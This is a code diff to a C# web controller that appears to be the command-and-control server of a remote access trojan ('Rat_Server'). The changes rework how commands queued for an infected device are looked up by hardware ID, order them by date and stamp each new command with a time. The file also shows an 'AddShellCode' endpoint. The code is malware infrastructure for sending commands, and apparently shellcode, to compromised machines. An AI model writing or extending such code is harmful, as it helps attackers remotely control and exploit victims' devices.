@@ -35,14 +35,25 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetCommands/{deviceId}")]
-        public async Task<ActionResult<List<Command>>> GetDeviceCommands(Guid deviceId)
+        public async Task<ActionResult<List<Command>>> GetDeviceCommands(string deviceId)
         {
-            if (await _context.Devices.FindAsync(deviceId) == null)
+            if (await _context.Devices.FirstOrDefaultAsync(d => d.Hwid.ToString().Equals(deviceId)) == null)
             {
                 return NotFound("No Device with the corresponding deviceId was found");
             }
 
-            return Ok(await _context.Commands.Where(q => q.DevicedHwid == deviceId).ToListAsync());
+            List<DeviceCommandDto> commands = new List<DeviceCommandDto>();
+            foreach(Command c in await _context.Commands.Where(q => q.DevicedHwid.ToString().Equals(deviceId)).OrderBy(q => q.DateAdded).ToListAsync())
+            {
+                commands.Add(new DeviceCommandDto
+                {
+                    commandId = c.commandId.ToString(),
+                    CommandValue = c.CommandValue,
+                    Hwid = c.DevicedHwid.ToString()
+                });
+            }
+            
+            return Ok(commands);
         }
 
         [HttpPost("AddShellCode")]
@@ -156,18 +167,14 @@ namespace Rat_Server.Controllers
             {
                 Device = device,
                 DevicedHwid = device.Hwid,
-                CommandValue = addCommandDto.CommandValue
+                CommandValue = addCommandDto.CommandValue,
+                DateAdded = DateTime.Now
             };
 
             await _context.Commands.AddAsync(command);
             await _context.SaveChangesAsync();
 
-            return new DeviceCommandDto
-            {
-                commandId = command.commandId.ToString(),
-                CommandValue = command.CommandValue,
-                Hwid = command.DevicedHwid.ToString()
-            };
+            return Created();
         }
     }
 }
